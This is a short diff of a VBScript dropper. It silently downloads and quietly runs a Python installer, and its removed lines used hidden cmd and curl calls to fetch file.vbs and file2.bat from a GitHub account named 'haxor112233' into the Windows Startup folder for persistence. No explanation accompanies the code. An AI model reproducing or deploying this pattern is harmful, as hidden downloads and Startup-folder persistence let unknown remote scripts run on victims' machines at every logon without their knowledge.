@@ -15,10 +15,6 @@ objShell.Run "cmd /c curl -s -o ""%TEMP%\python-3.13.1-amd64.exe"" ""https://www
 ' Run the Python installer with silent options
 objShell.Run """%TEMP%\python-3.13.1-amd64.exe"" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1", 0, True
 
-' Download file.vbs to Startup folder
-objShell.Run "cmd /c curl -s -o """ & startupFolder & "file.vbs"" ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/file.vbs""", 0, True
 
-' Download file2.bat to Startup folder
-objShell.Run "cmd /c curl -s -o """ & startupFolder & "file2.bat"" ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/file2.bat""", 0, True
 
 
